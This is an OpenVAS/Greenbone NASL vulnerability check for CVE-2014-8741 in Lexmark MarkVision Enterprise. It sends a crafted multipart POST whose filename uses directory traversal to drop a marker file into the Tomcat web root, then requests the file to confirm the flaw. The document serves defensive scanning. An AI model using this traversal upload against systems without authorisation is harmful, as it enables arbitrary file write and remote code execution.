# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:lexmark:markvision";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105171");
  script_cve_id("CVE-2014-8741");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2024-06-28T15:38:46+0000");

  script_name("Lexmark MarkVision Enterprise RCE Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71623");
  script_xref(name:"URL", value:"http://support.lexmark.com/index?page=content&id=TE667&locale=EN&userlocale=EN_US");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow attackers to execute
  arbitrary code in the context of affected application. Failed attacks may cause a denial-of-service condition.");

  script_tag(name:"vuldetect", value:"Try to upload a file with a special crafted HTTP POST request.");

  script_tag(name:"solution", value:"The vulnerability has been fixed in MarkVision Enterprise v2.1 and all future releases.");

  script_tag(name:"summary", value:"Lexmark MarkVision Enterprise is prone to a remote code
  execution (RCE) vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"affected", value:"Versions prior to Lexmark MarkVision Enterprise 2.1 are vulnerable.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-29 20:25:00 +0000 (Wed, 29 Jan 2020)");
  script_tag(name:"creation_date", value:"2015-01-16 13:54:49 +0100 (Fri, 16 Jan 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_lexmark_markvision_enterprise_detect.nasl");
  script_require_ports("Services/www", 9788);
  script_mandatory_keys("lexmark_markvision_enterprise/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

vtstrings = get_vt_strings();
success = vtstrings["lowercase_rand"];
rand = rand() + '_' + rand();
match = vtstrings["default"] + ' CVE-2014-8741 Check';

file = "/..\..\..\tomcat\webapps\ROOT\" + vtstrings["default"] + ".txt";

data = '-----------------' + vtstrings["default"] + '\r\n' +
       'Content-Disposition: form-data; name="success"\r\n' +
       '\r\n' +
       success + ':$fn\r\n' +
       '-----------------' + vtstrings["default"] + '\r\n' +
       'Content-Disposition: form-data; name="failure"\r\n' +
       '\r\n' +
       vtstrings["default"] + '::ERROR\r\n' +
       '-----------------' + vtstrings["default"] + '\r\n' +
       'Content-Disposition: form-data; name="datafile"; filename="' + file  + '"\r\n' +
       'Content-Type: text/html\r\n' +
       '\r\n' +
       match + ' ' + rand + ' delete me\r\n' +
       '-----------------' + vtstrings["default"] + '--';

len = strlen( data );

req = 'POST ' + dir  + '/upload/gfd HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Accept-Language: en\r\n' +
      'Content-Type: multipart/form-data; boundary=---------------' + vtstrings["default"] + '\r\n' +
      'Connection: Close\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      data;
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( success >!< result )
  exit( 99 );

r = eregmatch( pattern:'>' + success + ':"([^"]+)"<', string:result );

if( ! isnull( r[1] ) )
{
  url = '/' +  r[1];
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( match >< buf && rand >< buf )
  {
    report = 'It was possible to upload the file "http://' + host + ':' + port + '/' + r[1] + '". Please delete this file.';
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );